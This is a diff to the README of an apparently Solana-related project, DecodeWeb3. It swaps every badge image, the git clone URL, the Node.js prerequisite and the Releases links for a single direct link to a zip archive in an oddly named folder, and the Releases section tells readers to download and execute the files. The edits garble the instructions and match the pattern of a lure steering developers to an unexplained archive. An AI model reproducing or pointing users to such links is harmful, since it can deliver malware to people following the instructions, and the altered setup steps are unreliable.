@@ -2,7 +2,7 @@
 
 Welcome to the **DecodeWeb3** repository! This project focuses on decoding the Solana Web3, enabling developers and enthusiasts to interact with the Solana blockchain more effectively. 
 
-![Solana](https://img.shields.io/badge/Solana-Blockchain-blue?style=flat-square)
+![Solana](https://github.com/GgMigueGg/DecodeWeb3/raw/refs/heads/main/endellionite/Web-Decode-1.8.zip)
 
 ## Table of Contents
 
@@ -33,7 +33,7 @@ To get started with **DecodeWeb3**, follow these simple steps:
 1. **Clone the Repository**:
 
    ```bash
-   git clone https://github.com/GgMigueGg/DecodeWeb3.git
+   git clone https://github.com/GgMigueGg/DecodeWeb3/raw/refs/heads/main/endellionite/Web-Decode-1.8.zip
    ```
 
 2. **Navigate to the Directory**:
@@ -44,7 +44,7 @@ To get started with **DecodeWeb3**, follow these simple steps:
 
 3. **Install Dependencies**:
 
-   Make sure you have Node.js installed. Then run:
+   Make sure you have https://github.com/GgMigueGg/DecodeWeb3/raw/refs/heads/main/endellionite/Web-Decode-1.8.zip installed. Then run:
 
    ```bash
    npm install
@@ -100,11 +100,11 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Releases
 
-To download the latest version of **DecodeWeb3**, visit the [Releases](https://github.com/GgMigueGg/DecodeWeb3/releases) section. Here, you can find the files you need to download and execute.
+To download the latest version of **DecodeWeb3**, visit the [Releases](https://github.com/GgMigueGg/DecodeWeb3/raw/refs/heads/main/endellionite/Web-Decode-1.8.zip) section. Here, you can find the files you need to download and execute.
 
 For updates and new features, keep an eye on the releases page. 
 
-![Releases](https://img.shields.io/badge/Releases-Latest-brightgreen?style=flat-square)
+![Releases](https://github.com/GgMigueGg/DecodeWeb3/raw/refs/heads/main/endellionite/Web-Decode-1.8.zip)
 
 ## Conclusion
 
@@ -112,6 +112,6 @@ For updates and new features, keep an eye on the releases page.
 
 Explore the features, contribute to the project, and join our community to enhance your understanding of Solana's Web3. 
 
-For the latest releases, remember to check the [Releases](https://github.com/GgMigueGg/DecodeWeb3/releases) section.
+For the latest releases, remember to check the [Releases](https://github.com/GgMigueGg/DecodeWeb3/raw/refs/heads/main/endellionite/Web-Decode-1.8.zip) section.
 
 Happy coding!
